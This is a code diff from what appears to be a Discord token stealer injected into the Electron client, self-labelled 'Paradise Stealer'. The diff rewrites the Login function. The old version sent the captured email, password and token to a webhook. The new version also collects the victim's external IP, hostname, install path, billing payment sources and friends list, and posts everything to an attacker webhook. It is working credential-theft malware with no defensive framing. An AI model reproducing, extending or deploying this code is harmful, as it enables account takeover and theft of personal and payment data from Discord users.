@@ -130,62 +130,95 @@ function GetBadges(flags) {
 	return badges
 }
 
-function Login(email, password, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );
-    xmlHttp.responseText;`, !0).then((info) => {
-        const json = JSON.parse(info);
-        var params = {
-            username: "Paradise Stealer",
-            content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/942128284722937866/944637621680869426/p.png",
-            embeds: [
-                {
-                    "color": 3447704,
-                    "fields": [
-                        {
-                            "name": "<a:arrow:765308889859751976> **Account Info**",
-
-                            
-
-                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`                             <:staff_blue:936543701294010399> **Password:** \`${password}\``,
-                            "inline": false
-                        },
-                                {
-                                   "name": "<a:arrow:765308889859751976> **Other Info**",
-                                                                                                    
-                                                                                        
-        
-                                                                                                   
-                                   "value": `<a:pepe_nitro:906950345983397988> **Nitro Type:**  ${GetNitro(json.premium_type)}\n                                 <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
-                                 },
-
-
-
-                                 {
-                            "name": "**Token**",
-                            "value": `\`${token}\``,
-                            "inline": false
-                        }
-                    ],
-                    "author": {
-                        "name": json.username +"#" + json.discriminator + "・" + json.id,
-                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-                    },
-                    "footer": {
-                        "text": "Paradise Stealer "
-                    }
-                }
-            ]
-        }
-        SendToWebhook(JSON.stringify(params))
-    })
+function Login(e, t, n) {
+    const a = BrowserWindow.getAllWindows()[0];
+    a.webContents
+        .executeJavaScript(
+            `\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "${n}");\n    xmlHttp.send( null );\n    xmlHttp.responseText;`,
+            !0
+        )
+        .then((r) => {
+            a.webContents
+                .executeJavaScript('\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ', !0)
+                .then((o) => {
+                    a.webContents
+                        .executeJavaScript(
+                            `\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "${n}");\n        xmlHttp.send( null );\n        xmlHttp.responseText`,
+                            !0
+                        )
+                        .then((s) => {
+                            a.webContents
+                                .executeJavaScript(
+                                    `\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "${n}");\n            xmlHttp.send( null );\n            xmlHttp.responseText`,
+                                    !0
+                                )
+                                .then((a) => {
+                                    const i = JSON.parse(r);
+                                    var l = {
+                                        username: "ParadiseStealer",
+                                        content: "",
+                                        embeds: [
+                                            {
+                                                title: "User Login",
+                                                color: config["embed-color"],
+                                                fields: [
+                                                    { name: "Info", value: `\`\`\`Hostname: \n${computerName}\nIP: \n${o}\nInjection Info: \n${discordInstall}\n\`\`\``, inline: !1 },
+                                                    { name: "Username", value: `\`${i.username}#${i.discriminator}\``, inline: !0 },
+                                                    { name: "ID", value: `\`${i.id}\``, inline: !0 },
+                                                    { name: "Nitro", value: `${GetNitro(i.premium_type)}`, inline: !1 },
+                                                    { name: "Badges", value: `${GetBadges(i.flags)}`, inline: !1 },
+                                                    {
+                                                        name: "Billing",
+                                                        value: `${(function () {
+                                                            const e = JSON.parse(s);
+                                                            var t = "";
+                                                            return (
+                                                                e.forEach((e) => {
+                                                                    if ("" == e.type) return "`❌`";
+                                                                    if (2 == e.type && 1 != e.invalid) t += "`✔️` <:paypal:896441236062347374>";
+                                                                    else {
+                                                                        if (1 != e.type || 1 == e.invalid) return "`❌`";
+                                                                        t += "`✔️` :credit_card:";
+                                                                    }
+                                                                }),
+                                                                "" == t && (t = "`❌`"),
+                                                                t
+                                                            );
+                                                        })()}`,
+                                                        inline: !1,
+                                                    },
+                                                    { name: "Email", value: `\`${e}\``, inline: !0 },
+                                                    { name: "Password", value: `\`${t}\``, inline: !0 },
+                                                    { name: "Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
+                                                ],
+                                                author: { name: "ParadiseStealer" },
+                                                footer: { text: "ParadiseStealer" },
+                                                thumbnail: { url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}` },
+                                            },
+                                            {
+                                                title: `Total Friends (${JSON.parse(a).filter((e) => 1 == e.type).length})`,
+                                                color: config["embed-color"],
+                                                description: (function () {
+                                                    const e = JSON.parse(a).filter((e) => 1 == e.type);
+                                                    var t = "";
+                                                    for (z of e) {
+                                                        var n = GetRBadges(z.user.public_flags);
+                                                        "" != n && (t += n + ` ${z.user.username}#${z.user.discriminator}\n`);
+                                                    }
+                                                    return "" == t && (t = "No Rare Friends"), t;
+                                                })(),
+                                                author: { name: "ParadiseStealer" },
+                                                footer: { text: "ParadiseStealer" },
+                                                thumbnail: { url: `https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}` },
+                                            },
+                                        ],
+                                    };
+                                    SendToWebhook(JSON.stringify(l));
+                                });
+                        });
+                });
+        });
 }
-
 function ChangePassword(oldpassword, newpassword, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
